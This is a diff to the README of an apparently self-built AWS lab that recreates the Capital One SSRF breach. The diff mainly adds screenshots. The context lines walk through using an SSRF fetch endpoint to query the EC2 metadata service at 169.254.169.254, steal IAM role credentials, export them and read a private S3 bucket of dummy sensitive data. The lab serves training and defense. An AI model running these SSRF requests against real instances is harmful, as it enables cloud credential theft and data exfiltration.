@@ -100,6 +100,7 @@ This lab recreates the vulnerable environment faithfully:
     
 *   **Private S3 bucket** containing dummy sensitive data
     
+<img width="1693" height="929" alt="ChatGPT Image May 3, 2026, 10_43_54 PM" src="https://github.com/user-attachments/assets/5d467270-6355-48d4-8f12-3d7bb983c74f" />
 
 
 * * *
@@ -126,6 +127,8 @@ git clone https://github.com/ridamdarji25/AWS-Autopsy
 cd AWS-Autopsy/Case-01-SSRF-IAM-CapitalOne/terraform
 ```
 
+<img width="1242" height="495" alt="Screenshot 2026-05-03 225151" src="https://github.com/user-attachments/assets/c8d9e0f1-e395-48de-af04-78fa93bb91fd" />
+<br>
 
 > **Open** `terraform.tfvars` **and set your unique prefix:**
 
@@ -136,7 +139,8 @@ aws_region = "us-east-1"
 
 Why prefix? Every resource name uses your prefix — `yourname-autopsy-role`, `yourname-autopsy-sg`, `yourname-autopsy-sensitive-xxxx` — so there are no naming conflicts if multiple people run this lab.
 
-
+<img width="735" height="160" alt="Screenshot 2026-05-03 225413" src="https://github.com/user-attachments/assets/8655a9dc-15c5-4183-9d0c-ac536cacd1a8" />
+<br>
 
 > **Deploy the lab:**
 
@@ -147,6 +151,10 @@ terraform apply
 
 Type `yes` when prompted. Wait **2–3 minutes** for EC2 `user_data` to finish — it installs Python, Flask, and starts the app automatically via systemd.
 
+<img width="1246" height="715" alt="Screenshot 2026-05-03 225755" src="https://github.com/user-attachments/assets/02678845-c3c8-4826-98d7-98e17625b379" />
+<br>
+<img width="1255" height="532" alt="Screenshot 2026-05-03 230555" src="https://github.com/user-attachments/assets/5044b2ee-a647-4977-89f8-7dfb46bfd9fc" />
+<br>
 
 > **Note the outputs:**
 
@@ -168,7 +176,7 @@ Expected output:
 ```json
 {"status": "running"}
 ```
-
+<img width="790" height="326" alt="Screenshot 2026-05-03 230954" src="https://github.com/user-attachments/assets/0394e794-5cce-42bd-9bfd-f28ba32eb1d0" />
 
 * * *
 
@@ -184,6 +192,9 @@ http://<IP>:5000/fetch?url=http://127.0.0.1:5000
 
 You should see the HTML of example.com returned through the server. **SSRF confirmed** — the server is making requests on our behalf.
 
+<img width="1919" height="1052" alt="Screenshot 2026-05-03 231917" src="https://github.com/user-attachments/assets/e17dee66-69e1-49e8-98ae-872216a6522b" />
+
+***
 
 ### Step 2 — Reach the Metadata Service
 
@@ -207,6 +218,9 @@ public-ipv4
 
 We are now inside the metadata service.
 
+<img width="1919" height="345" alt="Screenshot 2026-05-03 232002" src="https://github.com/user-attachments/assets/6e5f8ff2-d0f7-4dbc-9eb2-c7153428e4cd" />
+
+***
 
 ### Step 3 — Get the IAM Role Name
 
@@ -220,8 +234,11 @@ Expected output:
 yourname-autopsy-role
 ```
 
+<img width="1919" height="407" alt="Screenshot 2026-05-03 232134" src="https://github.com/user-attachments/assets/dee551cd-91fd-4b66-97b2-9357ce81be51" />
 
-### Step 4 — Steal the Credentials 💀
+***
+
+### Step 4 — Steal the Credentials
 
 ```bash
 http://$EC2_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/yourname-autopsy-role
@@ -241,6 +258,9 @@ Expected output:
 
 These are **live, valid, temporary AWS credentials** — stolen via a single HTTP request.
 
+<img width="1919" height="539" alt="Screenshot 2026-05-03 232234" src="https://github.com/user-attachments/assets/9bc261f5-6a98-44a4-a1bc-1e373698b31f" />
+
+***
 
 ### Step 5 — Export the Stolen Credentials
 
@@ -252,8 +272,9 @@ export AWS_SECRET_ACCESS_KEY="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 export AWS_SESSION_TOKEN="AQoDYXdzEJr..."
 ```
 
+<img width="1297" height="424" alt="Screenshot 2026-05-03 234029" src="https://github.com/user-attachments/assets/50d69787-e0d9-4b78-82d1-6710477270c8" />
 
-* * *
+***
 
 ### Step 6 — Verify Identity with STS
 
@@ -275,6 +296,7 @@ Expected output:
 
 This confirms we are now acting **as the EC2 IAM role** — from our own machine, outside AWS.
 
+<img width="1234" height="394" alt="Screenshot 2026-05-03 234451" src="https://github.com/user-attachments/assets/36c204e3-c7f2-4abc-b6c2-a2b5a30362b5" />
 
 * * *
 
@@ -303,6 +325,7 @@ Expected output:
 2024-01-01 10:00:00    112 internal/db-config.json
 ```
 
+<img width="1255" height="500" alt="Screenshot 2026-05-03 235056" src="https://github.com/user-attachments/assets/f4910c10-762f-4b28-a10a-0d0b62b17c64" />
 
 * * *
 
@@ -328,6 +351,7 @@ id,name,ssn,card
 2,Jane Smith,XXX-XX-5678,4222222222222222
 ```
 
+<img width="1292" height="522" alt="Screenshot 2026-05-03 235503" src="https://github.com/user-attachments/assets/081256d4-db2c-4ffd-b950-a58f9edd492b" />
 
 * * *
 
@@ -469,6 +493,9 @@ terraform destroy
 
 Type `yes` to confirm. All EC2, IAM, S3, and Security Group resources will be removed.
 
+<img width="1315" height="451" alt="Screenshot 2026-05-03 235729" src="https://github.com/user-attachments/assets/8f79c025-d532-4b06-af33-4c75b13a2e9a" />
+<br>
+<img width="1301" height="388" alt="Screenshot 2026-05-03 235808" src="https://github.com/user-attachments/assets/79d67f49-2275-4172-9692-0f70f3e278d8" />
 
 * * *
 
